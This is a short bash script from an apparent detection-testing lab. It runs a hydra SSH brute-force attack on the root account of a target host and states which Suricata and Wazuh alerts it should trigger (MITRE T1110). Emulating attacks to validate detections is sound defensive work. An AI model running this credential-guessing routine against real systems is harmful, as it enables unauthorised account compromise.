#!/usr/bin/env bash
# Scénario T1110 — brute force SSH (credential access).
# Usage : ./bruteforce.sh <TARGET>
set -euo pipefail
TARGET="${1:-192.168.1.10}"
WORDLIST="$(dirname "$0")/wordlist-mini.txt"

if ! command -v hydra >/dev/null 2>&1; then
  echo "hydra manquant : sudo apt install hydra" >&2
  exit 1
fi

echo "[*] Brute force SSH sur ${TARGET} avec ${WORDLIST}"
echo "    (déclenche custom.rules SID 1000003 + Wazuh sshd_failed)"
hydra -l root -P "${WORDLIST}" -t 4 -f "ssh://${TARGET}" || true

echo "[+] Terminé. Détection attendue : Suricata 'MINISOC BRUTEFORCE' (T1110)"
echo "    + alertes Wazuh 5710/5712 sur l'hôte cible si SSH y est exposé."
